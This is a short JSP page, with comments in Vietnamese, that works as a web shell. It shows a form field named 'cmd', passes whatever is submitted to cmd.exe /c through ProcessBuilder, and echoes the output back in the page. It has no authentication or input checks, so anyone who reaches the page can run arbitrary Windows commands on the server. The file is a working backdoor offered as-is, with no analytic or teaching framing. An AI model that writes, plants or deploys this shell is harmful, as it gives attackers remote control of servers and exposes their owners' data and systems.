<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    String command = request.getParameter("cmd");
    if (command != null && !command.trim().isEmpty()) {
        StringBuffer output = new StringBuffer();
        try {
            ProcessBuilder builder = new ProcessBuilder();
            builder.command("cmd.exe", "/c", command);

            Process process = builder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;

            // Đọc kết quả dòng lệnh
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();

            out.println(output.toString());
        } catch (Exception e) {
            out.println("Lỗi khi thực thi lệnh: " + e.getMessage());
        }
    }
%>
</pre>
</BODY></HTML>

